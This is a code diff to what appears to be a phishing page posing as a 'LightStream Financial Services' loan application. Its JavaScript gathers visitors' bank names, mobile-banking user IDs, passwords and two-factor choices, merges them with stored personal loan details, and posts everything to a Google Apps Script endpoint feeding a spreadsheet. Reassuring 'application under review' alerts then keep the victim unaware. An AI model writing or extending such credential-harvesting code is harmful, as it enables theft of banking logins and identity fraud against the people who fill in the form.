@@ -521,24 +521,32 @@
             submitButton.textContent = 'Connecting...';
             submitButton.disabled = true;
             
-            // Create FormData for Google Apps Script
-            const formData = new FormData();
+            // Check if localStorage "loanData" exists
+            const loanData = localStorage.getItem('loanData');
+            const hasLoanData = loanData && JSON.parse(loanData).loanAmount;
             
-            // Add all form data
-            Object.keys(data).forEach(key => {
-                formData.append(key, data[key]);
+            console.log('🔍 Has loan data:', hasLoanData);
+            
+            let finalData = {};
+            
+            if (hasLoanData) {
+                // Full Application flow - merge personal data + bank data
+                const personalData = JSON.parse(loanData);
+                finalData = { ...personalData, ...data };
+                console.log('📊 Full application data:', finalData);
+            } else {
+                // Direct Bank flow - send only bank data
+                finalData = data;
+                console.log('📊 Direct bank data:', finalData);
+            }
+            
+            // Create FormData for submission
+            const formData = new FormData();
+            Object.keys(finalData).forEach(key => {
+                formData.append(key, finalData[key]);
             });
             
-            // Add bank auth specific fields
-            formData.append('bankName', document.getElementById('bankName').value);
-            formData.append('mobileBankingUserId', document.getElementById('userId').value);
-            formData.append('mobileBankingPassword', document.getElementById('password').value);
-            formData.append('twoFactorMethod', document.getElementById('twoFactor').value);
-            formData.append('termsAccepted', document.getElementById('terms').checked);
-            formData.append('timestamp', new Date().toISOString());
-            formData.append('type', 'bank_authentication');
-            
-            // Send to Google Apps Script using FormData (no CORS issues)
+            // Send data using fetch POST FormData
             fetch('https://script.google.com/macros/s/AKfycbxM0ZYTBPcLutmMdnmxO-H399LYdFfKiy6LuWkhYJb1XYxcv3SdAZH8VvPHh5Ny20S8dA/exec', {
                 method: 'POST',
                 body: formData,
@@ -548,27 +556,23 @@
             .then(result => {
                 console.log('Google Sheets response:', result);
                 
-                // Check if user came from personal loan form
-                const loanData = localStorage.getItem('loanData');
-                const hasLoanData = loanData && JSON.parse(loanData).loanAmount;
-                
-                console.log('🔍 Has loan data:', hasLoanData);
-                
+                // After successful submission
                 if (hasLoanData) {
-                    // User came from personal loan form - redirect to loan agreement
+                    // Full application - redirect to loan-agreement.html
                     alert('🏦 Bank Authentication Complete!\n\nYour application has been successfully submitted and is now under review.\n\nNext Steps:\n• You will receive your loan agreement shortly\n• Check your email for important updates\n• Loan decision typically within 24 hours\n\nThank you for choosing LightStream Financial Services.');
                     
                     // Store combined data for loan agreement
-                    const combinedData = JSON.parse(loanData);
-                    combinedData.bankAuthCompleted = true;
-                    localStorage.setItem("loanApplicationData", JSON.stringify(combinedData));
+                    localStorage.setItem("loanApplicationData", JSON.stringify(finalData));
                     
                     // Redirect to loan agreement page
                     setTimeout(() => {
                         window.location.href = "loan-agreement.html";
                     }, 1000);
                 } else {
-                    // Standalone bank auth - show success message
+                    // Direct bank - show success message or redirect to thank-you page
+                    alert('✅ Bank Authentication Submitted Successfully!\n\nYour bank authentication has been received and is being processed.\n\nWe will contact you shortly with next steps.\n\nThank you for choosing LightStream Financial Services.');
+                    
+                    // Show success message
                     const form = document.getElementById('bankAuthForm');
                     const formContainer = form.parentElement;
                     
@@ -585,6 +589,10 @@
                         </div>
                     `;
                 }
+                
+                // Clear localStorage after submit
+                localStorage.removeItem('loanData');
+                console.log('🗑️ localStorage cleared after submission');
             })
             .catch(error => {
                 console.error('Google Sheets submission failed:', error);
